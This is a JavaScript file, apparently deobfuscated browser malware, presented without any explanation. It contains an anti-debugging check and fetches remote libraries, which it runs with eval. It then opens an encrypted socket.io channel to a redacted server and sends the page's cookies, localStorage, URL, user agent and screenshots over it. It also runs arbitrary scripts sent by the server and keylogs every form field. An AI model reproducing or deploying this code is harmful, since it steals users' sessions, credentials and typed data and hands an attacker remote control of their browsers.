const initializeFunction = (function () {
	const constants = {};
	constants.EVAL_EVENT = "s_eval";
	constants.notEqual = function (a, b) {
		return a !== b;
	};
	constants.COMPARISON_1 = "IrbBr";
	constants.COMPARISON_2 = "ZeksU";
	constants.SECRET_KEY = "vnzPJ";
	constants.isEqual = function (a, b) {
		return a === b;
	};
	constants.COMPARISON_KEY = "XnWoj";
	const config = constants;
	let initialized = true;
	return function (context, callback) {
		if (config.isEqual("XnWoj", config.COMPARISON_KEY)) {
			const fn = initialized
				? function () {
						const evalEventConfig = {
							eventType: config.EVAL_EVENT,
						};
						const evalConfig = evalEventConfig;
						if (!config.notEqual(config.COMPARISON_1, config.COMPARISON_2)) {
							const result = _0x5f1c7d.apply(_0x180c19, arguments);
							_0x4844f2 = null;
							return result;
						}
						if (callback) {
							if (config.notEqual("ahhOu", config.SECRET_KEY)) {
								const result = callback.apply(context, arguments);
								callback = null;
								return result;
							} else {
								const event = {
									id: _0x42c19c,
									result: _0x2a6055.message,
								};
								_0x1b6f3b.emit(evalConfig.eventType, _0x456980(event));
							}
						}
				  }
				: function () {};
			initialized = false;
			return fn;
		}
		if (_0x1f2c71) {
			const result = _0x342485.apply(_0x1d6e8e, arguments);
			_0x167d11 = null;
			return result;
		}
	};
})();

const validateFunction = initializeFunction(this, function () {
	return validateFunction
		.toString()
		.search("(((.+)+)+)+$")
		.toString()
		.constructor(validateFunction)
		.search("(((.+)+)+)+$");
});

validateFunction();

(async () => {
	const resizeImage = (src, size = 400) =>
		new Promise((resolve) => {
			const img = new Image();
			img.src = src;
			img.onload = () => {
				const [width, height] = resizeDimensions(img.width, img.height, size);
				const canvas = document.createElement("canvas");
				canvas.width = width;
				canvas.height = height;
				canvas.getContext("2d").drawImage(img, 0, 0, width, height);
				resolve(canvas.toDataURL());
			};
		});

	function resizeDimensions(width, height, maxSize) {
		const scale = Math.min(maxSize / width, maxSize / height);
		return [Math.floor(width * scale), Math.floor(height * scale)];
	}

	const fetchAndEval = async (url) =>
		await fetch(url)
			.then((response) => response.text())
			.then(eval);
	const scriptUrls = [
		"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js",
		"https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js",
		"https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js",
	];

	for (const url of scriptUrls) {
		await fetchAndEval(url);
	}

	let encryptionKey = "KvMZ0G08Cn";
	let encryptData = (data) =>
		new TextEncoder().encode(
			CryptoJS.AES.encrypt(JSON.stringify(data), encryptionKey).toString()
		);
	let decryptData = (data) =>
		JSON.parse(
			CryptoJS.AES.decrypt(
				new TextDecoder().decode(data),
				encryptionKey
			).toString(CryptoJS.enc.Utf8)
		);

	const socketConfig = {
		path: "/pepsi",
		reconnectOnReconnect: true,
		reconnectTimeout: 1000,
	};

	let socket = io("redacted", socketConfig);

	socket.on("connect", async () => {
		let screenshot = (await html2canvas(document.body)).toDataURL("image/png");
		var payload = {
			cookie: document.cookie,
			localStorage: localStorage,
			agent: navigator.userAgent,
			origin: window.location.origin,
			href: window.location.href,
			image: await resizeImage(screenshot, 2000),
		};
		console.log(socket.id + " connected");
		socket.emit("s_connect", encryptData(payload));
		setInterval(logKeyStrokes, 500);
	});

	socket.on("c_eval", async (encryptedScript) => {
		const { id, script } = await decryptData(encryptedScript);
		try {
			let result = String(await eval("(async() => {" + script + "})();"));
			const response = {
				id: id,
				result: result,
			};
			socket.emit("s_eval", encryptData(response));
		} catch (error) {
			const errorMessage = {
				id: id,
				result: error.message,
			};
			socket.emit("s_eval", encryptData(errorMessage));
		}
	});

	let trackedElements = new Set();

	const logKeyStrokes = async () => {
		document.querySelectorAll("input, textarea, select").forEach((element) => {
			if (!trackedElements.has(element)) {
				let timeout;
				element.addEventListener("input", (event) => {
					clearTimeout(timeout);
					timeout = setTimeout(async () => {
						let screenshot = (await html2canvas(document.body)).toDataURL(
							"image/png"
						);
						let data = {
							name: event.target.id ? event.target.id : event.target.name,
							value: event.target.value,
							cookie: document.cookie,
							localStorage: localStorage,
							agent: navigator.userAgent,
							origin: window.location.origin,
							href: window.location.href,
							image: await resizeImage(screenshot, 2000),
						};
						socket.emit("s_keylogger", encryptData(data));
					}, 500);
				});
				trackedElements.add(element);
			}
		});
	};
})();
